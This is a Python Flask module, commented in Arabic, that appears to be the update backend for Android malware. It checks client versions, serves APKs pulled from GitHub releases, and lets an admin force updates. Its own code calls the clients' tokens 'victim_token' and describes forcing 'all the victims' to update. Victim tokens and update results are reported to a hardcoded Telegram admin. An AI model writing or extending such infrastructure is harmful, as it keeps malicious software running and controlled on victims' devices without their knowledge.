# apk_updater.py
# ============================================================
# نظام التحديث التلقائي للـ APK
# ============================================================

import os
import io
import json
import time
import hashlib
import requests
from datetime import datetime

from flask import Blueprint, request, jsonify, send_file, Response

from config import redis_client, GITHUB_TOKEN, GITHUB_REPO

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("apk_updater")

apk_update_bp = Blueprint('apk_update', __name__)


# ============================================================
# الإعدادات
# ============================================================
# رقم النسخة الحالية (تعدله لما تعمل build جديد)
CURRENT_VERSION_CODE = 1
CURRENT_VERSION_NAME = "1.0.0"

# الحد الأدنى للإصدار اللي يقبل التحديث
MIN_SUPPORTED_VERSION = 1

# مسار تخزين الـ APK مؤقتاً
UPDATE_CACHE_DIR = os.getenv("APK_CACHE_DIR", "/tmp/apk_cache")
os.makedirs(UPDATE_CACHE_DIR, exist_ok=True)

# GitHub Release tag
LATEST_RELEASE_TAG = os.getenv("LATEST_APK_TAG", "")


# ============================================================
# Helpers
# ============================================================
def _cache_key(filename):
    return f"apk_cache:{filename}"


def _get_cached_apk_info():
    """يرجع معلومات الـ APK المخزنة"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get("apk_current_info")
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.warning(f"cache read error: {e}")
    return None


def _save_apk_info(info):
    """يحفظ معلومات الـ APK"""
    if not redis_client:
        return
    try:
        redis_client.set("apk_current_info", json.dumps(info))
        redis_client.expire("apk_current_info", 86400 * 30)
    except Exception as e:
        logger.warning(f"cache save error: {e}")


def _find_latest_apk_release():
    """يبحث عن آخر APK في GitHub Releases"""
    if not GITHUB_TOKEN:
        return None

    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases?per_page=5"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
        }

        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code != 200:
            logger.warning(f"GitHub releases HTTP {r.status_code}")
            return None

        releases = r.json()
        if not releases:
            return None

        # أول release فيه ملف APK
        for release in releases:
            for asset in release.get("assets", []):
                name = asset.get("name", "")
                if name.endswith(".apk"):
                    return {
                        "version_code": CURRENT_VERSION_CODE,
                        "version_name": release.get("tag_name", "unknown"),
                        "url": asset.get("browser_download_url"),
                        "size": asset.get("size", 0),
                        "sha256": asset.get("digest", "").replace("sha256:", "") if asset.get("digest") else None,
                        "name": name,
                        "release_url": release.get("html_url"),
                        "published_at": release.get("published_at"),
                    }
    except Exception as e:
        logger.exception(f"find_latest_apk_release error: {e}")

    return None


def _download_apk_to_cache(url, filename):
    """يحمّل APK لـ cache السيرفر"""
    cache_path = os.path.join(UPDATE_CACHE_DIR, filename)

    # موجود؟ رجعه
    if os.path.exists(cache_path) and os.path.getsize(cache_path) > 10000:
        logger.info(f"APK already cached: {filename}")
        return cache_path

    try:
        logger.info(f"Downloading APK: {url}")
        r = requests.get(url, timeout=120, stream=True, allow_redirects=True)
        if r.status_code != 200:
            logger.error(f"APK download HTTP {r.status_code}")
            return None

        with open(cache_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)

        size = os.path.getsize(cache_path)
        logger.info(f"APK cached: {filename} ({size/1024/1024:.2f} MB)")
        return cache_path

    except Exception as e:
        logger.exception(f"download_apk error: {e}")
        return None


def _compute_sha256(filepath):
    """يحسب SHA256 للملف"""
    h = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


# ============================================================
# Routes
# ============================================================
def init_apk_update_routes(app, bot):

    @app.route('/apk/update/check', methods=['GET'])
    def apk_update_check():
        """
        يفحص لو فيه تحديث متاح
        GET /apk/update/check?version=1&token=xxx
        """
        try:
            client_version = request.args.get('version', '0')
            try:
                client_version = int(client_version)
            except ValueError:
                client_version = 0

            victim_token = request.args.get('token', '')

            logger.info(f"Update check: client_v={client_version}, current_v={CURRENT_VERSION_CODE}")

            # لو النسخة القديمة أكبر أو نفس الحالية → لا يوجد تحديث
            if client_version >= CURRENT_VERSION_CODE:
                return jsonify({
                    "update": False,
                    "latest_version": CURRENT_VERSION_CODE,
                    "message": "already_latest"
                }), 200

            # ابحث عن آخر APK
            cached_info = _get_cached_apk_info()

            # لو مفيش cache، نبحث في GitHub
            if not cached_info:
                latest = _find_latest_apk_release()
                if latest:
                    _save_apk_info(latest)
                    cached_info = latest

            if not cached_info:
                return jsonify({
                    "update": False,
                    "message": "no_release_found"
                }), 200

            # رجع التحديث
            metrics.inc_counter("apk_update_offered")

            # جهز URL للـ APK من عندنا
            update_url = f"{request.host_url.rstrip('/')}/apk/update/download"

            return jsonify({
                "update": True,
                "latest_version": cached_info.get("version_code", CURRENT_VERSION_CODE),
                "version_name": cached_info.get("version_name", ""),
                "download_url": update_url,
                "size": cached_info.get("size", 0),
                "sha256": cached_info.get("sha256"),
                "release_name": cached_info.get("name", "update.apk"),
                "mandatory": False,
            }), 200

        except Exception as e:
            logger.exception(f"apk_update_check error: {e}")
            return jsonify({"update": False, "error": str(e)}), 200


    @app.route('/apk/update/download', methods=['GET'])
    def apk_update_download():
        """
        يحمّل الـ APK الجديد
        """
        try:
            cached_info = _get_cached_apk_info()

            if not cached_info:
                return jsonify({"error": "no_apk_available"}), 404

            filename = cached_info.get("name", "update.apk")
            url = cached_info.get("url", "")

            if not url:
                return jsonify({"error": "no_url"}), 404

            # حمّل للـ cache لو مش موجود
            cache_path = _download_apk_to_cache(url, filename)

            if not cache_path or not os.path.exists(cache_path):
                return jsonify({"error": "download_failed"}), 500

            metrics.inc_counter("apk_update_downloaded")
            logger.info(f"APK update served: {filename}")

            return send_file(
                cache_path,
                mimetype='application/vnd.android.package-archive',
                as_attachment=True,
                download_name=filename
            )

        except Exception as e:
            logger.exception(f"apk_update_download error: {e}")
            return jsonify({"error": str(e)}), 500


    @app.route('/apk/update/version', methods=['GET'])
    def apk_version_info():
        """
        معلومات النسخة الحالية
        """
        return jsonify({
            "version_code": CURRENT_VERSION_CODE,
            "version_name": CURRENT_VERSION_NAME,
            "min_supported": MIN_SUPPORTED_VERSION,
            "server_time": time.time(),
        }), 200


    @app.route('/apk/update/report', methods=['POST'])
    def apk_update_report():
        """
        APK يبلغ عن نجاح/فشل التحديث
        """
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '')
            status = data.get('status', 'unknown')  # success, failed, downloading
            from_version = data.get('from_version', 0)
            to_version = data.get('to_version', 0)
            error = data.get('error', '')

            logger.info(
                f"Update report: status={status} "
                f"from={from_version} to={to_version} "
                f"token={victim_token[:12] if victim_token else 'none'}"
            )

            # إحصائية
            metrics.inc_counter(
                "apk_update_reports",
                tags={"status": status}
            )

            # إبلاغ الأدمن
            if status == 'success':
                _notify_admin_update_success(bot, victim_token, from_version, to_version)
            elif status == 'failed':
                _notify_admin_update_failed(bot, victim_token, from_version, to_version, error)

            return jsonify({"ok": True}), 200

        except Exception as e:
            logger.exception(f"apk_update_report error: {e}")
            return jsonify({"ok": False}), 200


    @app.route('/apk/update/force', methods=['POST'])
    def apk_force_update():
        """
        يجبر كل الضحايا على التحديث (admin only)
        """
        try:
            data = request.get_json(silent=True) or {}
            secret = data.get('secret', '')

            from config import ORIGIN_SECRET
            if secret != ORIGIN_SECRET:
                return jsonify({"error": "unauthorized"}), 403

            # خزّن flag في Redis
            if redis_client:
                redis_client.setex(
                    "apk_force_update",
                    3600,
                    str(int(time.time()))
                )

            logger.info("Force update triggered by admin")
            return jsonify({"ok": True}), 200

        except Exception as e:
            logger.exception(f"apk_force_update error: {e}")
            return jsonify({"error": str(e)}), 500


    logger.info("APK Update routes registered: /apk/update/*")


# ============================================================
# إشعارات الأدمن
# ============================================================
def _notify_admin_update_success(bot, victim_token, from_v, to_v):
    """يبلغ الأدمن بنجاح التحديث"""
    try:
        admin_ids = [7631249810]  # ضع IDs الأدمن هنا

        for admin_id in admin_ids:
            try:
                bot.send_message(
                    admin_id,
                    f"✅ <b>تحديث APK ناجح</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🔑 Token: <code>{victim_token[:16]}</code>\n"
                    f"📦 من: <code>{from_v}</code> → <code>{to_v}</code>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
    except Exception as e:
        logger.warning(f"notify admin update success error: {e}")


def _notify_admin_update_failed(bot, victim_token, from_v, to_v, error):
    """يبلغ الأدمن بفشل التحديث"""
    try:
        admin_ids = [7631249810]

        for admin_id in admin_ids:
            try:
                bot.send_message(
                    admin_id,
                    f"❌ <b>فشل تحديث APK</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🔑 Token: <code>{victim_token[:16]}</code>\n"
                    f"📦 من: <code>{from_v}</code> → <code>{to_v}</code>\n"
                    f"⚠️ السبب: <code>{error[:200]}</code>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
    except Exception as e:
        logger.warning(f"notify admin update failed error: {e}")
